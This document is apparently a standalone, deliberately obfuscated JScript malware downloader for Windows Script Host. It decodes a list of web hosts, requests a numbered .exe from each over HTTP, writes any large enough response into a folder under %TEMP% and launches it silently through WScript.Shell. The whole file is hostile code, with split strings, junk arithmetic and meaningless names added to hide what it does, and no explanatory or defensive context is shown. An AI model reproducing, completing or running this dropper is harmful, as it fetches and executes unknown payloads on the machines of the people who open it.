

function GhlnoyGkQ(ONYeHkyrFSW) {
var YiHARSfb = WScript.CreateObject("Wscript.Shell");
YiHARSfb.Run(ONYeHkyrFSW, 0x1, 0x0);
}
function fZAqHvzNc(JRVog,hKaks,SHsMp) {
var fkJQQ = "DMzepL DhV pt.Shell XNvqeIM Scri".split(" ");
var wFR=((1)?"W" + fkJQQ[4]:"")+fkJQQ[2];
var WT = WScript.CreateObject(wFR);
var BK = "%TEMP%\\";
return WT.ExpandEnvironmentStrings(BK);
}
function yZUfgNFA() {
var KkAGiva = "ipting";
var SgBvBXsKct = "ile";
var ddeWF = "System";
return "Sc" + "r" + KkAGiva + ".F" + SgBvBXsKct + ddeWF + "Obj" + "ect";
}
function hSUe(CGtsb) {
return WScript.CreateObject(CGtsb);
}
function aZXF(zCWFA,wPDvU) {
zCWFA.write(wPDvU);
}
function mZFG(berKP) {
berKP.open();
}
function nuwm(JsYJQ,xDpWT) {
JsYJQ.saveToFile(xDpWT,415-413);
}
function ZUFA(rQxSw,INnjC,wjliZ) {
rQxSw.open(wjliZ,INnjC,false);
}
function uTeO(mcbzE) {
if (mcbzE == 762-562){return true;} else {return false;}
}
function gCSC(omHPi) {
if (omHPi > 188709-726){return true;} else {return false;}
}
function zZAP(egCAP) {
var woneT="";
for(s=(193-193); s < egCAP.length; s++)
if (s % (946-944) != (904-904)) {
woneT += egCAP.substr(s, 206-205);
}
return woneT;
}
function QWcS(Zqyta) {
Zqyta.send();
}
function cEjH(Dlegw) {
return Dlegw.status;
}
function FtpWZ(eYWZls) {
return new ActiveXObject(eYWZls);
}
var qb="oo6hmeklLlmoGwarAujfkfH.LcNormb 8/R8y0H.QekxteS?L ktShliGs2i0sMietgsSqIqO.hcJoGmJ/C8w0H.WetxYeP?F J?N p?r N?";
var v = zZAP(qb).split(" ");
var MrA = fZAqHvzNc("Yhmd","OFLDf","QxGsqQ");
var slu = FtpWZ(yZUfgNFA());
var DTUL = MrA+"SmNDDsS\\";
try{
slu.CreateFolder(DTUL);
}catch(OebqAh){
};
var XBp = "2.XMLH";
var qwC = (XBp + "TTP" + " xkcOEbg fuWeh XML ream St CEqfayQg AD kzXzNOE OD").split(" ");
var Ba = true  , vvZt = qwC[7] + "" + qwC[9];
var Mn = hSUe("MS"+qwC[3]+(383107, qwC[0]));
var RVi = hSUe(vvZt + "B." + qwC[5]+(991874, qwC[4]));
var xFZ = 0;
var d = 1;
var jCKSWFd = 657082;
var Q=xFZ;
while (true)  {
if(Q>=v.length) {break;}
var ia = 0;
var qXX = ("ht" + " lwfFBpJ tp fAuPa vwrqZErT :// mEKVZNv .e xe G ET").split(" ");
try  {
ZUFA(Mn,qXX[0]+qXX[2]+qXX[5]+v[Q]+d, qXX[9]+qXX[10]); QWcS(Mn); if (uTeO(cEjH(Mn)))  {      
mZFG(RVi); RVi.type = 1; aZXF(RVi,Mn.responseBody); if (gCSC(RVi.size))  {
ia = 1; RVi.position = 0; nuwm(RVi,/*q6d045jFRR*/DTUL/*gsLu39OeKk*/+jCKSWFd+qXX[7]+qXX[8]); try  {
if (((new Date())>0,7304092888)) {
GhlnoyGkQ(DTUL+jCKSWFd+/*MhHz8142eM*/qXX[7]+qXX[8]/*j9ht49PDFg*/); 
break;
}
}
catch (SB)  {
}; 
}; RVi.close(); 
}; 
if (ia == 1)  {
xFZ = Q; break; 
}; 
}
catch (SB)  { 
}; 
Q++;
}; 

